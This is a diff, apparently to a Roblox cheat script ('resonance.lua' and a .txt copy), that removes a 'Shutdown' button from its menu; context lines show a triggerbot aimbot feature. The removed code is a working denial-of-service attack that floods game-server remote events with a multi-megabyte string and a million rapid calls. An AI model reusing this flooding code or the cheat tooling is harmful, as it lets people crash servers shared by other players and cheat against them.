@@ -1,0 +1,50 @@
+--- a/dist/resonance.lua
++++ b/dist/resonance.lua
+@@ -8413,22 +8413,6 @@
+ 	end
+ })
+ 
+-MiscGroup:AddButton({Text="Shutdown",Func=function()
+-	notify("Shutdown Pending","Instructions sent to the server",5)
+-	local Event1 = ReplicatedStorage:WaitForChild("DataEvents"):WaitForChild("UpdateTexturesChoice")
+-    Event1:FireServer(("ARCO"):rep(1e6))
+-
+-    task.wait()
+-
+-    local Event = ReplicatedStorage:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
+-    Event:FireServer(("a"):rep(1))
+-
+-    for i = 1, 1e6 do
+-        Event:FireServer()
+-    end
+-	
+-end})
+-
+ -- Triggerbot System
+ local Triggerbot = {
+ 	Enabled = false,
+--- a/dist/resonance.txt
++++ b/dist/resonance.txt
+@@ -8413,22 +8413,6 @@
+ 	end
+ })
+ 
+-MiscGroup:AddButton({Text="Shutdown",Func=function()
+-	notify("Shutdown Pending","Instructions sent to the server",5)
+-	local Event1 = ReplicatedStorage:WaitForChild("DataEvents"):WaitForChild("UpdateTexturesChoice")
+-    Event1:FireServer(("ARCO"):rep(1e6))
+-
+-    task.wait()
+-
+-    local Event = ReplicatedStorage:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
+-    Event:FireServer(("a"):rep(1))
+-
+-    for i = 1, 1e6 do
+-        Event:FireServer()
+-    end
+-	
+-end})
+-
+ -- Triggerbot System
+ local Triggerbot = {
+ 	Enabled = false,
